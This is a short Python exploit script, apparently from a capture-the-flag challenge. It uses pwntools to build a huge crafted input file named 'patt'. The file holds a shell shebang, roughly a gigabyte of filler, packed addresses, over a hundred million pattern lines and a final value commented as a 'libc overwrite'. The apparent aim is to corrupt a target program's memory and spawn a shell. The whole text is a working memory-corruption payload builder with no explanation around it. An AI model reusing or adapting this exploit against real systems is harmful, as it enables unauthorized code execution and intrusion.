#!/usr/bin/env python3

import sys
from pwn import *
import time

NUM_PATTERNS = (1<<27) + 2085405
longstr = b'y'*1090519038 # b'y'*2186534896

start = time.time()
print("Making pattern file...")
file = open("patt", "wb")
file.write(b'#!/bin/sh\n')
file.write(b'sh\n')
file.write(longstr)
file.write(p64(0))
file.write(p64(0x5bf002))
file.write(b'\n')
print("Starting patterns")
for i in range(NUM_PATTERNS-4):
    file.write(b'a\n')
    if i%1000000 == 0:
        print(f"{i}/{NUM_PATTERNS}")

# file.write(longstr)
file.write(b'AAAA') # libc overwrite
file.write(b'\n')
file.close()
print("Finished in {:.3f} seconds.".format(time.time()-start))